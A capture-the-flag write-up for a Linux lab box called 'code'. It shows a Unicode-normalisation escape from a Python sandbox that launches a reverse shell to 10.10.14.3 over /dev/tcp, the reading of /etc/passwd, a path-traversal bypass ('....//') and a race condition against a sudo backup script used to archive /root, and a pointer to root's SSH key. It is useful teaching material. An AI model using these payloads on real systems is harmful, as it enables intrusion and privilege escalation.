| {{ 'code' | machine_img }} | Easy linux box. Starts with a simple python sandbox. Then we crack some hashes to get to the martin user. Finally we abuse a shell script to get root. |

It is a python code interpreter.

Has some kinda of filter on it:
![code2](/assets/img/code2.png)

Looks to be just a string filter so any mutation on a string will allow us to bypass it.

My favorite way is by using the python weird normalization feature [pep-3131](https://peps.python.org/pep-3131/):

It allows us to use unicode characters that get converted to ascii:
```python
𝕤𝕪𝕤.𝕞𝕠𝕕𝕦𝕝𝕖𝕤['so'[::-1]].𝕤𝕪𝕤𝕥𝕖𝕞("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'")
```

# app-production
```bash
app-production@code:~/app$ cat ~/user.txt
b5c84***************************
```

## users with shell
```bash
app-production@code:~/app$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
app-production:x:1001:1001:,,,:/home/app-production:/bin/bash
martin:x:1000:1000:,,,:/home/martin:/bin/bash
```

Dumping the db and checking crackstation gives two passwords, one works for martin ssh:

# martin

Looks like we need to exploit the `backy.sh` shell script
```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Here is the script:
```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Seems to be just a wrapper for [backy](https://github.com/vdbsh/backy). Which is also a wrapper to rsync and tar.

![code4](/assets/img/code4.png)

The script takes a json file as input and does some validations.

The json file need to have the following format:
```json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```

The first check tries to filter against path traversals:

```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json"
```

The second one checks if the starting dir is on the allowed paths:

```bash
allowed_paths=("/var/" "/home/")

...

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}
```

I couldn't bypass the second one.
In the first one gsub doesn't recursively removes the path traversal. So we can just do:
```json
{
  "destination": "/dev/shm",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
```

A second way of bypassing both checks is by doing a race condition. You open to shells and do:
```bash
# shell 1
while :; do sudo /usr/bin/backy.sh ./task.json; done
# shell 2
cp task.json bak.json
while :; do cat solution.json > task.json; cat bak.json > task.json; done
```

Then you just read the backup at for the flag `/dev/shm/code_root_2025_August.tar.bz2`.

```bash
martin@code:~$ cat root/root.txt
ddeb9***************************
```

__You can get the root shell by reading /root/.ssh/id_rsa__
